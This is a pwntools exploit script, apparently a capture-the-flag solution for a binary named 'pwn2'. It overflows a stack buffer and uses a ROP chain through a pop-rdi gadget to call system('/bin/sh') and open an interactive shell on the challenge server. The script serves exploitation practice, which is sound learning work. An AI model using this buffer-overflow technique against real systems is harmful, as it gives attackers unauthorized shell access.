from pwn import *

binary = context.binary = ELF("./pwn2")
libc = ELF("./libc.so")
ld = ELF("./ld.so")

if args.REMOTE:
    p = remote('challs.n00bzunit3d.xyz', 61223)
elif args.GDB:
    p = gdb.debug([ld.path, binary.path], env={"LD_PRELOAD":libc.path}, gdbscript="b *main")
else:
    p = process([ld.path, binary.path], env={"LD_PRELOAD":libc.path})

# pop rdi; ret
rdi_gadget  = 0x401196
input_addr  = 0x404090
system_addr = 0x401280

shellcode = b"/bin/sh\x00"
p.sendline(shellcode)

payload = b""
payload += b"A" * 0x28
payload += p64(rdi_gadget)
payload += p64(input_addr)
payload += p64(system_addr)

p.sendline(payload)

p.interactive()